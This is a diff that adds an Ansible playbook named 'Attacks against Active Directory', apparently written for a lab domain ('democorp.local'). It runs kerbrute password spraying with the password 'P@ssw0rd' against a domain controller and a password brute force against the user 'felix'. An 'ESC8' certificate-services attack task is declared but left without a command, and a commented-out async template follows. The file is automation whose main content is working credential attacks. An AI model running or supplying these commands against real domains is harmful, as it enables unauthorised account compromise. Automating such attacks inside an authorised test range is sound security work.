@@ -1,0 +1,18 @@
+---
+- name: Attacks against Active Directory
+  hosts: hacker
+  tasks:
+  - name: Password Spraying
+    shell: kerbrute passwordspray -d democorp.local --dc 10.0.0.11 usernames.txt 'P@ssw0rd'
+    register: passwordspray
+  - name: Brute force user felix
+    shell: kerbrute bruteuser --dc 10.0.0.11 -d democorp.local passwords.txt felix
+    register: bruteforce
+  - name: ESC8
+    shell: 
+
+
+#  - name: Run a long task asynchronously
+#  command: /path/to/long_task.sh
+#  async: 600  # Time in seconds to allow the task to run
+#  poll: 0     # Do not wait for the task to complete
